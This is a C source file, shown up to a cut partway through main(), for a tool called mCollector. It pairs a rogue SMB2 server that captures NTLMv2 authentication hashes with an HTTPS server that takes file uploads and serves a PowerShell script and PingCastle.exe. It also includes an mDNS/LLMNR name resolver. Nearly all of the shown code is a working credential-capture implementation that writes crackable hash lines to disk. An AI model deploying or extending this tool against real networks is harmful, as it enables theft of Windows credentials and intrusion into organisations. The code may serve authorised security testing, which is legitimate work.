


// mCollector.c — SMB2 NTLMv2 hash capture + HTTPS file server + mDNS/LLMNR
// Build: gcc -O2 -Wall mCollector.c nameresolver.c mongoose.c -o mCollector -lssl -lcrypto
// Run:   sudo ./mCollector

#include "mongoose.h"
#include "nameresolver.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <ifaddrs.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/stat.h>
#include <stdbool.h>
#include <dirent.h>

#include <openssl/evp.h>
#include <openssl/x509.h>
#include <openssl/x509v3.h>
#include <openssl/pem.h>
#include <openssl/bio.h>
#include <openssl/bn.h>

#define MCOLLECTOR_VERSION "1.3.1"
#define MCOLLECTOR_BUILD   __DATE__ " " __TIME__
#define HASHES_FILE        "uploads/hashes.txt"
#define NR_HOSTNAME        "mytt"

static const char *s_web_root   = ".";
static const char *s_upload_dir = "uploads";
static int generate_tls_keypair(char **out_cert_pem, char **out_key_pem) {
    EVP_PKEY *pkey = NULL;
    X509 *x509 = NULL;
    X509_NAME *name = NULL;
    BIO *bio = NULL;
    long pem_len;
    char *pem_data;
    int ret = -1;

    *out_cert_pem = NULL;
    *out_key_pem = NULL;

    /* Generate 2048-bit RSA key (compatible with OpenSSL 1.1.x and 3.x) */
    EVP_PKEY_CTX *kctx = EVP_PKEY_CTX_new_id(EVP_PKEY_RSA, NULL);
    if (!kctx) goto cleanup;
    if (EVP_PKEY_keygen_init(kctx) <= 0 ||
        EVP_PKEY_CTX_set_rsa_keygen_bits(kctx, 2048) <= 0 ||
        EVP_PKEY_keygen(kctx, &pkey) <= 0) {
        EVP_PKEY_CTX_free(kctx);
        goto cleanup;
    }
    EVP_PKEY_CTX_free(kctx);
    if (!pkey) goto cleanup;

    /* Create self-signed X509 v3 certificate */
    x509 = X509_new();
    if (!x509) goto cleanup;

    X509_set_version(x509, 2);  /* v3 — required for SAN extension */
    ASN1_INTEGER_set(X509_get_serialNumber(x509), 1);
    X509_gmtime_adj(X509_getm_notBefore(x509), 0);
    X509_time_adj_ex(X509_getm_notAfter(x509), 730000, 0, NULL);  /* ~2000 years */
    X509_set_pubkey(x509, pkey);

    name = X509_get_subject_name(x509);
    X509_NAME_add_entry_by_txt(name, "CN", MBSTRING_ASC,
                               (const unsigned char *)"mytt.local", -1, -1, 0);
    X509_set_issuer_name(x509, name);

    /* Add Subject Alternative Names: DNS:mytt.local, DNS:mytt */
    GENERAL_NAMES *san_names = sk_GENERAL_NAME_new_null();
    if (!san_names) goto cleanup;

    const char *dns_names[] = {"mytt.local", "mytt"};
    for (int i = 0; i < 2; i++) {
        GENERAL_NAME *gen = GENERAL_NAME_new();
        if (!gen) { sk_GENERAL_NAME_pop_free(san_names, GENERAL_NAME_free); goto cleanup; }
        ASN1_IA5STRING *ia5 = ASN1_IA5STRING_new();
        if (!ia5) { GENERAL_NAME_free(gen); sk_GENERAL_NAME_pop_free(san_names, GENERAL_NAME_free); goto cleanup; }
        ASN1_STRING_set(ia5, dns_names[i], (int)strlen(dns_names[i]));
        GENERAL_NAME_set0_value(gen, GEN_DNS, ia5);
        sk_GENERAL_NAME_push(san_names, gen);
    }
    X509_add1_ext_i2d(x509, NID_subject_alt_name, san_names, 0, 0);
    sk_GENERAL_NAME_pop_free(san_names, GENERAL_NAME_free);

    if (!X509_sign(x509, pkey, EVP_sha256())) goto cleanup;

    /* Write private key to PEM string */
    bio = BIO_new(BIO_s_mem());
    if (!bio) goto cleanup;
    if (!PEM_write_bio_PrivateKey(bio, pkey, NULL, NULL, 0, NULL, NULL)) goto cleanup;
    pem_len = BIO_get_mem_data(bio, &pem_data);
    *out_key_pem = malloc((size_t)pem_len + 1);
    if (!*out_key_pem) goto cleanup;
    memcpy(*out_key_pem, pem_data, (size_t)pem_len);
    (*out_key_pem)[pem_len] = '\0';
    BIO_free(bio);

    /* Write certificate to PEM string */
    bio = BIO_new(BIO_s_mem());
    if (!bio) goto cleanup;
    if (!PEM_write_bio_X509(bio, x509)) goto cleanup;
    pem_len = BIO_get_mem_data(bio, &pem_data);
    *out_cert_pem = malloc((size_t)pem_len + 1);
    if (!*out_cert_pem) goto cleanup;
    memcpy(*out_cert_pem, pem_data, (size_t)pem_len);
    (*out_cert_pem)[pem_len] = '\0';

    ret = 0;

cleanup:
    if (ret != 0) {
        free(*out_cert_pem); *out_cert_pem = NULL;
        free(*out_key_pem);  *out_key_pem = NULL;
    }
    BIO_free(bio);
    X509_free(x509);
    EVP_PKEY_free(pkey);
    return ret;
}

static struct mg_str s_tls_cert = {0};
static struct mg_str s_tls_key  = {0};
static char s_external_ip[64]   = "";

// ─── Utility ──────────────────────────────────────────────────────────────────

static void bin2hex(const uint8_t *in, size_t n, char *out) {
    static const char h[] = "0123456789abcdef";
    for (size_t i = 0; i < n; i++) {
        out[i*2]   = h[in[i] >> 4];
        out[i*2+1] = h[in[i] & 0xf];
    }
    out[n*2] = '\0';
}

static uint16_t rl16(const uint8_t *p) {
    return (uint16_t)(p[0] | ((uint16_t)p[1] << 8));
}
static uint32_t rl32(const uint8_t *p) {
    return p[0] | ((uint32_t)p[1]<<8) | ((uint32_t)p[2]<<16) | ((uint32_t)p[3]<<24);
}
static void wl16(uint8_t *p, uint16_t v) { p[0]=v&0xff; p[1]=(v>>8)&0xff; }
static void wl32(uint8_t *p, uint32_t v) {
    p[0]=v&0xff; p[1]=(v>>8)&0xff; p[2]=(v>>16)&0xff; p[3]=(v>>24)&0xff;
}

static void utf16le_to_ascii(const uint8_t *s, size_t len,
                              char *dst, size_t dsz) {
    size_t j = 0;
    for (size_t i = 0; i+1 < len && j+1 < dsz; i += 2)
        dst[j++] = (char)s[i];
    dst[j] = '\0';
}

static void ensure_upload_dir(void) { mkdir(s_upload_dir, 0755); }

static void nb_seal(uint8_t *buf, size_t payload_len) {
    buf[0] = 0x00;
    buf[1] = (payload_len >> 16) & 0xff;
    buf[2] = (payload_len >>  8) & 0xff;
    buf[3] =  payload_len        & 0xff;
}

// ─── Deduplication ────────────────────────────────────────────────────────────

#define MAX_SEEN_HASHES 256
static char s_seen_users[MAX_SEEN_HASHES][512];
static int  s_seen_count = 0;

static bool user_already_seen(const char *username, const char *domain) {
    char key[512];
    snprintf(key, sizeof(key), "%s::%s", username, domain);
    for (int i = 0; i < s_seen_count; i++)
        if (strcmp(s_seen_users[i], key) == 0) return true;
    if (s_seen_count < MAX_SEEN_HASHES) {
        snprintf(s_seen_users[s_seen_count], sizeof(s_seen_users[0]), "%s", key);
        s_seen_count++;
    }
    return false;
}

static void load_seen_users(void) {
    FILE *f = fopen(HASHES_FILE, "r");
    if (!f) return;
    char line[8192];
    int loaded = 0;
    while (fgets(line, sizeof(line), f) && s_seen_count < MAX_SEEN_HASHES) {
        char *p1 = strstr(line, "::");
        if (!p1) continue;
        char usr[256]="", dom[256]="";
        size_t ulen = (size_t)(p1 - line);
        if (ulen == 0 || ulen >= sizeof(usr)) continue;
        memcpy(usr, line, ulen); usr[ulen] = '\0';
        char *p2 = strchr(p1+2, ':');
        if (!p2) continue;
        size_t dlen = (size_t)(p2 - (p1+2));
        if (dlen >= sizeof(dom)) continue;
        memcpy(dom, p1+2, dlen); dom[dlen] = '\0';
        char key[512];
        snprintf(key, sizeof(key), "%s::%s", usr, dom);
        bool dup = false;
        for (int i = 0; i < s_seen_count; i++)
            if (strcmp(s_seen_users[i], key) == 0) { dup = true; break; }
        if (!dup) {
            snprintf(s_seen_users[s_seen_count], sizeof(s_seen_users[0]), "%s", key);
            s_seen_count++;
            loaded++;
        }
    }
    fclose(f);
    if (loaded > 0)
        printf("  loaded    : %d previously captured user(s)\n", loaded);
}

// ─── SMB state machine ────────────────────────────────────────────────────────

#define SMB_STAGE_NEW        0
#define SMB_STAGE_SMB2_INIT  1
#define SMB_STAGE_SMB2_NEGO  2
#define SMB_STAGE_SMB2_CHALL 3
#define SMB_STAGE_DONE       4

typedef struct {
    int      stage;
    int      conn_id;
    uint8_t  challenge[8];
    uint64_t session_id;
} smb_state_t;

static int s_conn_counter = 0;

// ─── SPNEGO / NTLMSSP ─────────────────────────────────────────────────────────

static const uint8_t SPNEGO_NEGTOKENINIT[] = {
    0x60, 0x48,
      0x06, 0x06, 0x2b,0x06,0x01,0x05,0x05,0x02,
      0xa0, 0x3e,
        0x30, 0x3c,
          0xa0, 0x0e,
            0x30, 0x0c,
              0x06, 0x0a,
                0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a,
          0xa3, 0x2a,
            0x30, 0x28,
              0xa0, 0x26,
                0x1b, 0x24,
                  'n','o','t','_','d','e','f','i','n','e','d','_',
                  'i','n','_','R','F','C','4','1','7','8','@',
                  'p','l','e','a','s','e','_','i','g','n','o','r','e',
};
#define SPNEGO_INIT_LEN sizeof(SPNEGO_NEGTOKENINIT)

static size_t der_len(uint8_t *buf, size_t val) {
    if (val < 0x80) { buf[0]=(uint8_t)val; return 1; }
    if (val < 0x100){ buf[0]=0x81; buf[1]=(uint8_t)val; return 2; }
    buf[0]=0x82; buf[1]=(val>>8)&0xff; buf[2]=val&0xff; return 3;
}

static size_t spnego_neg_token_resp(uint8_t *out, size_t outsz,
                                    const uint8_t *ntlm, size_t ntlm_len) {
    uint8_t tmp[2048]; size_t pos = 0;
    uint8_t lbuf[4];

    tmp[pos++]=0xa0; tmp[pos++]=0x03;
    tmp[pos++]=0x0a; tmp[pos++]=0x01; tmp[pos++]=0x01;

    size_t oct_len_sz = der_len(lbuf, ntlm_len);
    size_t inner_len  = 1 + oct_len_sz + ntlm_len;
    tmp[pos++] = 0xa2;
    pos += der_len(tmp+pos, inner_len);
    tmp[pos++] = 0x04;
    pos += der_len(tmp+pos, ntlm_len);
    if (pos + ntlm_len > sizeof(tmp)) return 0;
    memcpy(tmp+pos, ntlm, ntlm_len); pos += ntlm_len;

    size_t seq_content = pos;
    size_t ctx_content = 1 + der_len(lbuf, seq_content) + seq_content;
    size_t total       = 1 + der_len(lbuf, ctx_content) + ctx_content;
    if (total > outsz) return 0;

    size_t o = 0;
    out[o++] = 0xa1;
    o += der_len(out+o, ctx_content);
    out[o++] = 0x30;
    o += der_len(out+o, seq_content);
    memcpy(out+o, tmp, seq_content); o += seq_content;
    return o;
}

static size_t build_ntlmssp_challenge(uint8_t *blob, size_t bsz,
                                       const uint8_t *srv_challenge) {
    static const uint8_t TARGET_NAME[] = {
        'W',0,'O',0,'R',0,'K',0,'G',0,'R',0,'O',0,'U',0,'P',0
    };
    const size_t tname_len = sizeof(TARGET_NAME);
    static const uint8_t SERVER_UTF16[] = {'S',0,'E',0,'R',0,'V',0,'E',0,'R',0};

    uint8_t tinfo[256]; size_t ti = 0;
    /* MsvAvNbDomainName */
    wl16(tinfo+ti, 0x0002); ti+=2;
    wl16(tinfo+ti, (uint16_t)tname_len); ti+=2;
    memcpy(tinfo+ti, TARGET_NAME, tname_len); ti+=tname_len;
    /* MsvAvNbComputerName */
    wl16(tinfo+ti, 0x0001); ti+=2;
    wl16(tinfo+ti, (uint16_t)sizeof(SERVER_UTF16)); ti+=2;
    memcpy(tinfo+ti, SERVER_UTF16, sizeof(SERVER_UTF16)); ti+=sizeof(SERVER_UTF16);
    /* MsvAvEOL */
    wl16(tinfo+ti, 0x0000); ti+=2;
    wl16(tinfo+ti, 0x0000); ti+=2;

    const size_t tname_off = 56;
    const size_t tinfo_off = tname_off + tname_len;
    const size_t total     = tinfo_off + ti;
    if (total > bsz) return 0;
    memset(blob, 0, total);

    memcpy(blob, "NTLMSSP\0", 8);
    wl32(blob+8, 2);
    wl16(blob+12, (uint16_t)tname_len);
    wl16(blob+14, (uint16_t)tname_len);
    wl32(blob+16, (uint32_t)tname_off);
    wl32(blob+20, 0x00000001
                | 0x00000200
                | 0x00008000
                | 0x00010000
                | 0x00020000
                | 0x00800000
                | 0x20000000
                | 0x80000000);
    memcpy(blob+24, srv_challenge, 8);
    wl16(blob+40, (uint16_t)ti);
    wl16(blob+42, (uint16_t)ti);
    wl32(blob+44, (uint32_t)tinfo_off);
    blob[48]=6; blob[49]=1; wl16(blob+50, 7600); blob[55]=0x0f;
    memcpy(blob+tname_off, TARGET_NAME, tname_len);
    memcpy(blob+tinfo_off, tinfo, ti);
    return total;
}

// ─── NTLMSSP_AUTH parser ──────────────────────────────────────────────────────

static void parse_ntlmssp_auth(const uint8_t *sec_blob, size_t sec_len,
                                const uint8_t *challenge) {
    const uint8_t *p = NULL;
    for (size_t i = 0; i+12 < sec_len; i++) {
        if (memcmp(sec_blob+i, "NTLMSSP\0", 8) == 0) { p = sec_blob+i; break; }
    }
    if (!p || rl32(p+8) != 3) return;

    size_t avail = sec_len - (size_t)(p - sec_blob);
    if (avail < 52) return;  /* minimum NTLMSSP_AUTH header size */

    uint16_t nt_len  = rl16(p+20); uint32_t nt_off  = rl32(p+24);
    uint16_t dom_len = rl16(p+28); uint32_t dom_off = rl32(p+32);
    uint16_t usr_len = rl16(p+36); uint32_t usr_off = rl32(p+40);
    uint16_t ws_len  = rl16(p+44); uint32_t ws_off  = rl32(p+48);

    /* Overflow-safe bounds checks: verify offset+length doesn't
       exceed available data using subtraction instead of addition */
    if (nt_off  > avail || nt_len  > avail - nt_off  ||
        usr_off > avail || usr_len > avail - usr_off ||
        dom_off > avail || dom_len > avail - dom_off ||
        ws_off  > avail || ws_len  > avail - ws_off  ||
        nt_len < 24) return;

    char username[256]="", domain[256]="", workstation[256]="";
    utf16le_to_ascii(p+usr_off, usr_len, username,    sizeof(username));
    utf16le_to_ascii(p+dom_off, dom_len, domain,      sizeof(domain));
    utf16le_to_ascii(p+ws_off,  ws_len,  workstation, sizeof(workstation));

    if (user_already_seen(username, domain)) {
        printf("  [─] %s\\%s  already captured\n", domain, username);
        fflush(stdout);
        return;
    }

    const uint8_t *nt_resp  = p + nt_off;
    const uint8_t *nt_blob  = nt_resp + 16;
    size_t         blob_len = (size_t)(nt_len - 16);

    char chall_hex[17]="", proof_hex[33]="";
    bin2hex(challenge, 8,  chall_hex);
    bin2hex(nt_resp,   16, proof_hex);

    char *blob_hex = malloc(blob_len*2+1);
    if (!blob_hex) return;
    bin2hex(nt_blob, blob_len, blob_hex);

    char hash_line[8192];
    snprintf(hash_line, sizeof(hash_line), "%s::%s:%s:%s:%s",
             username, domain, chall_hex, proof_hex, blob_hex);
    free(blob_hex);

    printf("\n  \033[1;32m[★] NTLMv2  %s\\%s\033[0m  (ws: %s)\n", domain, username, workstation);
    printf("      %s\n\n", hash_line);
    fflush(stdout);

    ensure_upload_dir();
    FILE *f = fopen(HASHES_FILE, "a");
    if (f) { fprintf(f, "%s\n", hash_line); fclose(f); }
}

// ─── SMB2 builders ────────────────────────────────────────────────────────────

static uint64_t smb2_get_u64(const uint8_t *smb2, int off) {
    uint64_t v = 0;
    for (int i = 0; i < 8; i++) v |= (uint64_t)smb2[off+i] << (i*8);
    return v;
}

static void smb2_build_hdr(uint8_t *hdr,
                            uint16_t cmd, uint32_t status,
                            uint16_t credit_charge, uint16_t credits,
                            uint64_t message_id, uint64_t session_id) {
    memset(hdr, 0, 64);
    hdr[0]=0xFE; hdr[1]='S'; hdr[2]='M'; hdr[3]='B';
    wl16(hdr+4,  64);
    wl16(hdr+6,  credit_charge);
    wl32(hdr+8,  status);
    wl16(hdr+12, cmd);
    wl16(hdr+14, credits ? credits : 1);
    wl32(hdr+16, 0x00000001);
    for (int i=0;i<8;i++) hdr[24+i]=(uint8_t)(message_id>>(i*8));
    hdr[32]=0xFE; hdr[33]=0xFF;
    for (int i=0;i<8;i++) hdr[40+i]=(uint8_t)(session_id>>(i*8));
}

static size_t smb2_nego_response(uint8_t *buf, size_t bufsz,
                                  const uint8_t *client_smb2,
                                  uint16_t dialect) {
    /* max: 4 + 64 + 64 + SPNEGO_INIT_LEN(74) = 206 */
    if (bufsz < 4 + 64 + 64 + SPNEGO_INIT_LEN) return 0;
    size_t pos = 4;
    uint8_t hdr[64];
    smb2_build_hdr(hdr, 0x0000, 0x00000000,
                   rl16(client_smb2+6),
                   rl16(client_smb2+14) ? rl16(client_smb2+14) : 1,
                   smb2_get_u64(client_smb2, 24), 0);
    memcpy(buf+pos, hdr, 64); pos += 64;

    uint8_t body[64]; memset(body, 0, 64);
    wl16(body+0, 65);
    body[2] = 0x01;
    wl16(body+4, dialect);
    static const uint8_t GUID[16] = {
        0x6b,0x69,0x6c,0x6c,0x65,0x72,0x62,0x65,
        0x65,0x66,0x61,0x63,0x61,0x63,0x61,0x30
    };
    memcpy(body+8, GUID, 16);
    wl32(body+24, 0x0000007f);
    wl32(body+28, 0x00800000);
    wl32(body+32, 0x00800000);
    wl32(body+36, 0x00800000);
    uint64_t ft = (uint64_t)time(NULL)*10000000ULL + 116444736000000000ULL;
    for (int i=0;i<8;i++) body[40+i]=(uint8_t)(ft>>(i*8));
    wl16(body+56, 128);
    wl16(body+58, (uint16_t)SPNEGO_INIT_LEN);
    memcpy(buf+pos, body, 64); pos += 64;
    memcpy(buf+pos, SPNEGO_NEGTOKENINIT, SPNEGO_INIT_LEN); pos += SPNEGO_INIT_LEN;

    nb_seal(buf, pos-4);
    return pos;
}

static size_t smb2_step1_response(uint8_t *buf, size_t bufsz,
                                   const uint8_t *client_smb1) {
    uint8_t fake[64]; memset(fake, 0, 64);
    fake[0]=0xFE; fake[1]='S'; fake[2]='M'; fake[3]='B';
    wl16(fake+14, 1);
    fake[24] = client_smb1[30];
    fake[25] = client_smb1[31];
    return smb2_nego_response(buf, bufsz, fake, 0x02ff);
}

static size_t smb2_step2_response(uint8_t *buf, size_t bufsz,
                                   const uint8_t *client_smb2) {
    return smb2_nego_response(buf, bufsz, client_smb2, 0x0210);
}

static size_t smb2_session_challenge(uint8_t *buf, size_t bufsz,
                                      const uint8_t *smb2,
                                      const uint8_t *srv_challenge,
                                      uint64_t *session_id_out) {
    if (bufsz < 4 + 64 + 8 + 640) return 0;  /* hdr + body + max spnego */
    uint64_t mid = smb2_get_u64(smb2, 24);
    uint64_t sid = smb2_get_u64(smb2, 40);
    if (!sid) sid = 0x0000000400000001ULL;
    *session_id_out = sid;

    size_t pos = 4;
    uint8_t hdr[64];
    smb2_build_hdr(hdr, 0x0001, 0xC0000016,
                   rl16(smb2+6), rl16(smb2+14) ? rl16(smb2+14) : 1,
                   mid, sid);
    memcpy(buf+pos, hdr, 64); pos += 64;

    uint8_t ntlm[512];   size_t ntlm_len;
    uint8_t spnego[640]; size_t spnego_len;
    ntlm_len   = build_ntlmssp_challenge(ntlm, sizeof(ntlm), srv_challenge);
    spnego_len = spnego_neg_token_resp(spnego, sizeof(spnego), ntlm, ntlm_len);
    if (!ntlm_len || !spnego_len) return 0;

    uint8_t body[8];
    wl16(body+0, 9);
    wl16(body+2, 0);
    wl16(body+4, 64+8);
    wl16(body+6, (uint16_t)spnego_len);
    memcpy(buf+pos, body, 8); pos += 8;
    memcpy(buf+pos, spnego, spnego_len); pos += spnego_len;

    nb_seal(buf, pos-4);
    return pos;
}

static size_t smb2_session_failure(uint8_t *buf, size_t bufsz,
                                    const uint8_t *smb2,
                                    uint64_t session_id) {
    if (bufsz < 4 + 64 + 9) return 0;  /* NB header + SMB2 hdr + body */
    size_t pos = 4;
    uint8_t hdr[64];
    smb2_build_hdr(hdr, 0x0001, 0xC0000022,
                   rl16(smb2+6), rl16(smb2+14) ? rl16(smb2+14) : 1,
                   smb2_get_u64(smb2, 24), session_id);
    memcpy(buf+pos, hdr, 64); pos += 64;

    uint8_t body[9]; memset(body, 0, sizeof(body));
    wl16(body+0, 9);
    memcpy(buf+pos, body, 9); pos += 9;

    nb_seal(buf, pos-4);
    return pos;
}

static void smb2_parse_auth(const uint8_t *smb2, size_t smb2_len,
                              const uint8_t *challenge) {
    if (smb2_len < 64+25) return;
    const uint8_t *body = smb2 + 64;
    uint16_t sec_off = rl16(body+12);
    uint16_t sec_len = rl16(body+14);
    if (sec_off > smb2_len || sec_len > smb2_len - sec_off) return;
    parse_ntlmssp_auth(smb2 + sec_off, sec_len, challenge);
}

// ─── SMB handler ──────────────────────────────────────────────────────────────

static void smb_handler(struct mg_connection *c, int ev, void *ev_data) {
    (void)ev_data;

    if (ev == MG_EV_ACCEPT) {
        smb_state_t *st = calloc(1, sizeof(smb_state_t));
        if (!st) { c->is_draining = 1; return; }

        FILE *rng = fopen("/dev/urandom", "rb");
        if (rng) { fread(st->challenge, 1, 8, rng); fclose(rng); }
        else {
            uint64_t seed = (uint64_t)time(NULL)
                          ^ (uint64_t)(uintptr_t)c
                          ^ ((uint64_t)(s_conn_counter+1) << 32);
            for (int i = 0; i < 8; i++) {
                seed ^= seed << 13; seed ^= seed >> 7; seed ^= seed << 17;
                st->challenge[i] = (uint8_t)(seed & 0xff);
            }
        }

        st->session_id = 0x0000000400000001ULL;
        st->stage      = SMB_STAGE_NEW;
        st->conn_id    = ++s_conn_counter;
        c->fn_data     = st;

        char ip[64];
        mg_snprintf(ip, sizeof(ip), "%M", mg_print_ip, &c->rem);

    } else if (ev == MG_EV_READ) {
        smb_state_t *st = (smb_state_t *)c->fn_data;
        if (!st || st->stage == SMB_STAGE_DONE) return;

        uint8_t *data = (uint8_t *)c->recv.buf;
        size_t   len  = c->recv.len;
        if (len < 8) return;

        uint32_t nb_claimed = ((uint32_t)data[1]<<16)
                            | ((uint32_t)data[2]<< 8)
                            |  (uint32_t)data[3];
        if (nb_claimed < 32 || len < 4 + nb_claimed) return;

        uint8_t *smb      = data + 4;
        bool is_smb1      = (smb[0]==0xFF && smb[1]=='S' && smb[2]=='M' && smb[3]=='B');
        bool is_smb2      = (nb_claimed >= 64 && smb[0]==0xFE && smb[1]=='S' && smb[2]=='M' && smb[3]=='B');
        uint16_t smb2_cmd = is_smb2 ? rl16(smb+12) : 0xFFFF;

        uint8_t resp[4096];
        size_t  resp_len = 0;

        // SMB1 Negotiate → upgrade to SMB2
        if (st->stage == SMB_STAGE_NEW && is_smb1 && smb[4] == 0x72) {
            resp_len = smb2_step1_response(resp, sizeof(resp), smb);
            if (resp_len) { mg_send(c, resp, resp_len); st->stage = SMB_STAGE_SMB2_INIT; }

        // SMB2 Negotiate
        } else if (is_smb2 && smb2_cmd == 0x0000 &&
                   (st->stage == SMB_STAGE_NEW || st->stage == SMB_STAGE_SMB2_INIT)) {
            resp_len = smb2_step2_response(resp, sizeof(resp), smb);
            if (resp_len) { mg_send(c, resp, resp_len); st->stage = SMB_STAGE_SMB2_NEGO; }

        // SMB2 SessionSetup #1 → NTLMSSP_CHALLENGE
        } else if (st->stage == SMB_STAGE_SMB2_NEGO && is_smb2 && smb2_cmd == 0x0001) {
            resp_len = smb2_session_challenge(resp, sizeof(resp), smb,
                                               st->challenge, &st->session_id);
            if (resp_len) { mg_send(c, resp, resp_len); st->stage = SMB_STAGE_SMB2_CHALL; }

        // SMB2 SessionSetup #2 → parse AUTH, capture hash
        } else if (st->stage == SMB_STAGE_SMB2_CHALL && is_smb2 && smb2_cmd == 0x0001) {
            smb2_parse_auth(smb, nb_claimed, st->challenge);
            resp_len = smb2_session_failure(resp, sizeof(resp), smb, st->session_id);
            if (resp_len) mg_send(c, resp, resp_len);
            c->is_draining = 1;
            st->stage = SMB_STAGE_DONE;
        }

        mg_iobuf_del(&c->recv, 0, 4 + nb_claimed);

    } else if (ev == MG_EV_CLOSE) {
        free(c->fn_data);
        c->fn_data = NULL;
    }
}

// ─── HTTPS / HTTP handlers ────────────────────────────────────────────────────

static struct mg_str load_file(const char *path) {
    struct mg_str r = {0};
    FILE *f = fopen(path, "rb");
    if (!f) return r;
    fseek(f, 0, SEEK_END); long sz = ftell(f); rewind(f);
    if (sz <= 0) { fclose(f); return r; }
    char *buf = malloc((size_t)sz);
    if (!buf || fread(buf,1,(size_t)sz,f)!=(size_t)sz) {
        free(buf); fclose(f); return r;
    }
    fclose(f);
    r.buf = buf; r.len = (size_t)sz;
    return r;
}

static int uri_equals(struct mg_str s, const char *cstr) {
    return s.len == strlen(cstr) && memcmp(s.buf, cstr, s.len) == 0;
}

static void handle_redirect(struct mg_connection *c, int ev, void *ev_data) {
    if (ev == MG_EV_HTTP_MSG) {
        struct mg_http_message *hm = (struct mg_http_message *)ev_data;
        struct mg_str *h = mg_http_get_header(hm, "Host");
        char host[256] = "localhost";
        if (h) {
            snprintf(host, sizeof(host), "%.*s", (int)h->len, h->buf);
            char *co = strchr(host, ':'); if (co) *co = '\0';
        }
        char loc[512];
        snprintf(loc, sizeof(loc), "Location: https://%s%.*s\r\n",
                 host, (int)hm->uri.len, hm->uri.buf);
        mg_http_reply(c, 301, loc, "");
    }
}

static void handle_request(struct mg_connection *c, int ev, void *ev_data) {
    if (ev == MG_EV_ACCEPT) {
        struct mg_tls_opts opts = {0};
        opts.cert = s_tls_cert;
        opts.key  = s_tls_key;
        mg_tls_init(c, &opts);
    } else if (ev == MG_EV_HTTP_MSG) {
        struct mg_http_message *hm = (struct mg_http_message *)ev_data;
        struct mg_http_serve_opts sopts = {0};
        sopts.root_dir = s_web_root;

        if (uri_equals(hm->uri, "/upload") &&
            mg_match(hm->method, mg_str("POST"), NULL)) {
            struct mg_http_part part; size_t ofs = 0;
            ensure_upload_dir();
            while ((ofs = mg_http_next_multipart(hm->body, ofs, &part)) != 0) {
                if (part.filename.len > 0) {
                    /* sanitize filename: find last path separator */
                    const char *fname = part.filename.buf;
                    size_t flen = part.filename.len;
                    size_t start = 0;
                    for (size_t k = 0; k < flen; k++) {
                        if (fname[k] == '/' || fname[k] == '\\')
                            start = k + 1;
                    }
                    fname += start;
                    flen  -= start;
                    /* reject empty, dotfiles, and names containing
                       null bytes or characters outside the allowlist */
                    if (flen == 0 || fname[0] == '.') continue;
                    bool bad = false;
                    for (size_t k = 0; k < flen; k++) {
                        char ch = fname[k];
                        if (ch == '\0') { bad = true; break; }
                        bool ok = (ch >= 'a' && ch <= 'z') ||
                                  (ch >= 'A' && ch <= 'Z') ||
                                  (ch >= '0' && ch <= '9') ||
                                  ch == '.' || ch == '_' || ch == '-';
                        if (!ok) { bad = true; break; }
                    }
                    if (bad) continue;
                    char path[512];
                    snprintf(path, sizeof(path), "%s/%.*s", s_upload_dir,
                             (int)flen, fname);
                    FILE *fp = fopen(path, "wb");
                    if (fp) {
                        fwrite(part.body.buf, 1, part.body.len, fp);
                        fclose(fp);
                        printf("[+] Uploaded: %s\n", path);
                        mg_http_reply(c, 200, "", "Uploaded %s\n", path);
                    } else {
                        mg_http_reply(c, 500, "", "Write failed\n");
                    }
                }
            }
            return;
        }

        /* /uploads/ route removed — was exposing sensitive data without auth */
        if (uri_equals(hm->uri, "/mCollector.ps1"))
            { mg_http_serve_file(c, hm, "mCollector.ps1", &sopts); return; }
        if (uri_equals(hm->uri, "/PingCastle.exe"))
            { mg_http_serve_file(c, hm, "PingCastle.exe", &sopts); return; }
        if (uri_equals(hm->uri, "/"))
            { mg_http_serve_file(c, hm, "index.html", &sopts); return; }
        mg_http_reply(c, 301, "Location: /\r\n", "");
    }
}

static void print_local_ips(void) {
    struct ifaddrs *ifaddr, *ifa;
    if (getifaddrs(&ifaddr)) return;
    for (ifa = ifaddr; ifa; ifa = ifa->ifa_next) {
        if (!ifa->ifa_addr || ifa->ifa_addr->sa_family != AF_INET) continue;
        struct sockaddr_in *a = (struct sockaddr_in *)ifa->ifa_addr;
        char ip[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &a->sin_addr, ip, sizeof(ip));
        if (!strncmp(ip, "127.", 4)) continue;
        char https[64], http[64];
        snprintf(https, sizeof(https), "https://%s:443", ip);
        snprintf(http,  sizeof(http),  "http://%s:80",   ip);
        printf("  %-6s  %-42s  %s\n", ifa->ifa_name, https, "file server");
        printf("  %-6s  %-42s  %s\n", "",             http,  "-> redirects to HTTPS");
    }
    freeifaddrs(ifaddr);
}

static void external_ip_handler(struct mg_connection *c, int ev, void *ev_data) {
    if (ev == MG_EV_CONNECT)
        mg_printf(c, "GET / HTTP/1.0\r\nHost: api.ipify.org\r\n\r\n");
    else if (ev == MG_EV_HTTP_MSG) {
        struct mg_http_message *hm = (struct mg_http_message *)ev_data;
        snprintf(s_external_ip, sizeof(s_external_ip), "%.*s",
                 (int)hm->body.len, hm->body.buf);
        c->is_draining = 1;
    } else if (ev == MG_EV_ERROR) {
        c->is_draining = 1;
    }
}

// ─── main ─────────────────────────────────────────────────────────────────────

static void clear_uploads(void) {
    DIR *d = opendir(s_upload_dir);
    if (!d) return;
    struct dirent *e;
    int count = 0;
    while ((e = readdir(d)) != NULL) {
        if (e->d_name[0] == '.') continue;
        char path[512];
        snprintf(path, sizeof(path), "%s/%s", s_upload_dir, e->d_name);
        if (remove(path) == 0) count++;
    }
    closedir(d);
    printf("[*] Cleared %d file(s) from %s/\n", count, s_upload_dir);
}

int main(int argc, char **argv) {
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--clear") == 0 || strcmp(argv[i], "-c") == 0) {
            ensure_upload_dir();
            clear_uploads();
            return 0;
        }
        if (strcmp(argv[i], "--help") == 0 || strcmp(argv[i], "-h") == 0) {
            printf("Usage: %s [options]\n"
                   "  -c, --clear   Clear uploads directory and exit\n"
                   "  -h, --help    Show this help\n", argv[0]);
            return 0;
        }
    }

    mg_log_set(MG_LL_NONE);

    struct mg_mgr tmp; mg_mgr_init(&tmp);
    mg_http_connect(&tmp, "http://api.ipify.org:80", external_ip_handler, NULL);
    for (int i = 0; i < 50; i++) {
        mg_mgr_poll(&tmp, 100);
        if (s_external_ip[0]) break;
    }
    mg_mgr_free(&tmp);

    ensure_upload_dir();

    /* Try loading certs from disk, otherwise generate ephemeral ones */
    s_tls_cert = load_file("cert.pem");
    s_tls_key  = load_file("key.pem");
    if (!s_tls_cert.len || !s_tls_key.len) {
